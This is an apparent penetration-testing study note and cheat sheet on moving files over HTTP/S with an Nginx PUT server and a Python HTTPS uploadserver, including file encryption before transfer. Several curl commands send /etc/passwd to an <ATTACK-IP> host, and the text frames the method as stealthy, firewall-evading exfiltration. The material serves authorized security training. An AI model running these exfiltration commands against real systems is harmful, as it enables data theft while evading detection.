## 🎯 Why Use HTTP/HTTPS for File Transfers?

HTTP and HTTPS are:

- ✅ Almost always allowed through firewalls
    
- ✅ Less suspicious than SMB/FTP
    
- ✅ Encrypted in transit (HTTPS)
    
- ✅ Common in enterprise environments
    

> There is nothing worse than being on a penetration test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption.

Always prefer:

- **HTTPS**
    
- Or encrypt the file before transfer (OpenSSL/AES)
    

---

# 🔐 Secure Upload Server with Nginx (PUT Method)

Instead of using Python uploadserver, we can configure **Nginx** to accept HTTP PUT requests.

## Why Nginx over Apache?

- Simpler configuration
    
- No automatic PHP execution
    
- Minimal by default
    
- Less risk of accidentally executing uploaded web shells
    

> Apache makes it easy to shoot ourselves in the foot… PHP executes anything ending in `.php`.

---

# 🧱 Step 1 – Create Upload Directory

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

## 🔑 Change Ownership

```bash
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

This ensures Nginx (running as `www-data`) can write files.

---

# ⚙️ Step 2 – Create Nginx Config

Create file:

```
/etc/nginx/sites-available/upload.conf
```

Add:

```nginx
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

### 🔍 Explanation

|Directive|Purpose|
|---|---|
|`listen 9001;`|Use alternate port (avoid 80 conflicts)|
|`root`|Upload base directory|
|`dav_methods PUT;`|Enable HTTP PUT uploads|

---

# 🔗 Step 3 – Enable Site

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

---

# ▶ Step 4 – Restart Nginx

```bash
sudo systemctl restart nginx.service
```

If errors occur:

```bash
tail -2 /var/log/nginx/error.log
```

---

# 🚨 Port 80 Already in Use (Common in PwnBox)

Error example:

```
bind() to 0.0.0.0:80 failed (98: Address already in use)
```

Check what's listening:

```bash
ss -lnpt | grep 80
```

Find process:

```bash
ps -ef | grep <PID>
```

Fix by removing default config:

```bash
sudo rm /etc/nginx/sites-enabled/default
```

Then restart Nginx again.

---

# 📤 Upload File Using cURL (PUT Request)

```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

### 🔍 What `-T` Does

`-T` = Transfer file using HTTP PUT

---

# 📥 Verify File Upload

```bash
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

Example output:

```
user65:x:1000:1000:,,,:/home/user65:/bin/bash
```

---

# 🔒 Security Considerations

## ❌ Avoid:

- Directory listing enabled
    
- PHP execution in upload folder
    
- World-writable directories
    
- Public access to sensitive upload paths
    

## ✅ Good Practice:

- Use non-standard port (9001)
    
- Use obscure path name
    
- Restrict firewall access
    
- Use HTTPS if possible
    
- Encrypt sensitive files before upload
    

---

# 🔍 Why Directory Listing Matters

With Apache:

- If no `index.html`
    
- It will list all files by default
    
- Bad for exfiltration staging
    

With Nginx:

- Directory listing not enabled by default
    
- Safer out of the box
    

---

# 🧠 Attack Use Case

This method is ideal when:

- SMB blocked
    
- FTP blocked
    
- Netcat flagged
    
- Need encrypted transfer
    
- Need firewall-friendly exfiltration
    

---

# 🔄 Typical Red Team Workflow

1. Encrypt sensitive file
    
2. Start Nginx PUT server
    
3. Upload via `curl -T`
    
4. Remove file from target
    
5. Shut down server
    

---

# 🛡 Professional Reminder

> As information security professionals, we must act professionally and responsibly and take all measures to protect any data we encounter during an assessment.

Never exfiltrate:

- PII
    
- Credit card data
    
- Trade secrets
    
- Unless explicitly authorized
    

Use dummy data for DLP testing.

---

# 📌 Quick Reference

|Task|Command|
|---|---|
|Create upload dir|`mkdir -p`|
|Change owner|`chown www-data`|
|Enable PUT|`dav_methods PUT;`|
|Upload file|`curl -T file http://host:port/path/file.txt`|
|Check error log|`/var/log/nginx/error.log`|
|Check port conflict|`ss -lnpt`|

---

### CheatSheet

# 🌐 HTTP/S File Transfer Cheat Sheet (Red Team / Pentest)

---

## 🎯 WHY HTTP/S?

- ✅ Almost always allowed through firewalls
    
- ✅ Blends with normal traffic
    
- ✅ HTTPS = encrypted in transit
    
- ✅ Less suspicious than SMB/FTP/Netcat
    

> Always prefer HTTPS or encrypt files before transfer.

---

# 📤 QUICK UPLOAD WITH NGINX (HTTP PUT)

---

## 🧱 1️⃣ Create Upload Directory

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

---

## ⚙️ 2️⃣ Create Nginx Config

Create:

```
/etc/nginx/sites-available/upload.conf
```

Add:

```nginx
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}
```

---

## 🔗 3️⃣ Enable Site

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl restart nginx
```

---

## 📤 4️⃣ Upload File with cURL

```bash
curl -T /etc/passwd http://<ATTACK-IP>:9001/SecretUploadDirectory/users.txt
```

Verify:

```bash
tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

---

# 🔐 HTTPS UPLOAD SERVER (PYTHON)

---

## 🛠 Install Upload Server

```bash
pip3 install uploadserver
```

---

## 🔑 Generate Self-Signed Cert

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

---

## 🚀 Start HTTPS Upload Server

```bash
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

---

## 📤 Upload from Target (Linux)

```bash
curl -X POST https://<ATTACK-IP>/upload \
-F 'files=@/etc/passwd' \
--insecure
```

---

# 📥 SIMPLE FILE DOWNLOAD (FROM ATTACKER)

---

## 🐍 Python HTTP Server

```bash
python3 -m http.server 8000
```

Target download:

```bash
wget http://<ATTACK-IP>:8000/file.txt
```

or

```bash
curl -O http://<ATTACK-IP>:8000/file.txt
```

---

# 🔒 ENCRYPT BEFORE TRANSFER (RECOMMENDED)

---

## 🔐 Linux – OpenSSL AES256

Encrypt:

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in file.txt -out file.enc
```

Decrypt:

```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in file.enc -out file.txt
```

---

## 🪟 Windows – AES PowerShell

Import:

```powershell
Import-Module .\Invoke-AESEncryption.ps1
```

Encrypt:

```powershell
Invoke-AESEncryption -Mode Encrypt -Key "StrongPass!" -Path .\file.txt
```

Decrypt:

```powershell
Invoke-AESEncryption -Mode Decrypt -Key "StrongPass!" -Path .\file.txt.aes
```

---

# 🛠 TROUBLESHOOTING

---

## 🔍 Port Conflict

```bash
ss -lnpt | grep 80
tail -f /var/log/nginx/error.log
```

---

## 🚨 If Directory Listing Enabled (Apache Risk)

- Remove autoindex
    
- Use Nginx (safer default)
    
- Ensure no PHP execution in upload dir
    

---

# 🧠 WHEN TO USE WHICH METHOD

|Scenario|Recommended Method|
|---|---|
|Firewall strict|HTTPS|
|Need stealth|HTTPS PUT|
|SMB blocked|HTTP/S|
|Sensitive data|Encrypt + HTTPS|
|Quick staging|Python HTTP server|
|Red team exfil|Nginx PUT + encryption|

---

# ⚠ PROFESSIONAL REMINDER

- Do **NOT** exfiltrate real PII unless authorized
    
- Use dummy data for DLP testing
    
- Always encrypt sensitive files
    
- Clean up after operation
    

---

# 🏁 FAST REFERENCE COMMANDS

```bash
# Start quick web server
python3 -m http.server 8000

# Upload with PUT
curl -T file.txt http://IP:9001/SecretUploadDirectory/file.txt

# Upload via POST
curl -X POST http://IP/upload -F 'files=@file.txt'

# Encrypt file
openssl enc -aes256 -pbkdf2 -in file -out file.enc
```

---
